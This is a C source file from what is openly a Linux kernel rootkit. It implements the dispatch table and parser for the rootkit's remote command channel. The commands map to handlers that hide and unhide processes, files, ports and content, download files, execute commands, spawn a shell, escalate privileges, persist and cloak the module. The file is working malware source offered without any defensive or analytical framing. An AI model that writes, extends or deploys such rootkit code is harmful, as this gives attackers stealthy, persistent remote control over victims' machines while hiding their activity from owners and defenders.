// SPDX-License-Identifier: GPL-2.0
// execution/dispatch.c - Function pointer dispatch table for commands.
#include <linux/string.h>
#include "rootkit.h"

struct rk_dispatch_entry {
	const char	*prefix;
	size_t		prefix_len;
	rk_handler_t	handler;
};

// Longer prefixes first so greedy match works correctly.
static const struct rk_dispatch_entry dispatch_table[] = {
	{ "UNHIDE CONTENT ", 15, cmd_unhide_content },
	{ "HIDE CONTENT ",   13, cmd_hide_content   },
	{ "UNHIDE FILE ",    12, cmd_unhide_file    },
	{ "UNHIDE PORT ",    12, cmd_unhide_port    },
	{ "UNHIDE PID ",     11, cmd_unhide_pid     },
	{ "HIDE FILE ",      10, cmd_hide_file      },
	{ "HIDE PORT ",      10, cmd_hide_port      },
	{ "HIDE PID ",        9, cmd_hide_pid       },
	{ "DOWNLOAD ",        9, cmd_download       },
	{ "EXEC ",            5, cmd_exec           },
	{ "LIST ",            5, cmd_list           },
	{ "UNPERSIST",        9, cmd_unpersist      },
	{ "UNCLOAK",          7, cmd_uncloak        },
	{ "ESCALATE",         8, cmd_escalate       },
	{ "PERSIST",          7, cmd_persist        },
	{ "STATUS",           6, cmd_status         },
	{ "SHELL",            5, cmd_shell          },
	{ "CLOAK",            5, cmd_cloak          },
	{ "PING",             4, cmd_ping           },
	{ "INFO",             4, cmd_info           },
};

static size_t strip_trailing(const u8 *buf, size_t len)
{
	while (len > 0 && (buf[len - 1] == '\n' || buf[len - 1] == '\r' ||
			   buf[len - 1] == ' '))
		len--;
	return len;
}

int rk_send_response(struct rk_session *s, const char *resp)
{
	return rk_send_sealed(s, (const u8 *)resp, strlen(resp));
}

int rk_dispatch(struct rk_session *s, const u8 *buf, size_t len)
{
	size_t i;

	len = strip_trailing(buf, len);
	if (!len)
		return rk_send_response(s, "ERR empty command");

	for (i = 0; i < ARRAY_SIZE(dispatch_table); i++) {
		const struct rk_dispatch_entry *e = &dispatch_table[i];

		if (len < e->prefix_len)
			continue;
		if (memcmp(buf, e->prefix, e->prefix_len) != 0)
			continue;

		// Commands with trailing space in prefix take an argument.
		// Commands without trailing space must match exactly.
		if (e->prefix[e->prefix_len - 1] == ' ') {
			// Has argument: everything after prefix
			char arg[RK_ARG_MAX];
			size_t arg_len = len - e->prefix_len;

			if (arg_len >= RK_ARG_MAX)
				arg_len = RK_ARG_MAX - 1;
			memcpy(arg, buf + e->prefix_len, arg_len);
			arg[arg_len] = '\0';
			return e->handler(s, arg);
		}

		// Exact match required
		if (len == e->prefix_len)
			return e->handler(s, NULL);
	}

	return rk_send_response(s, "ERR unknown command");
}
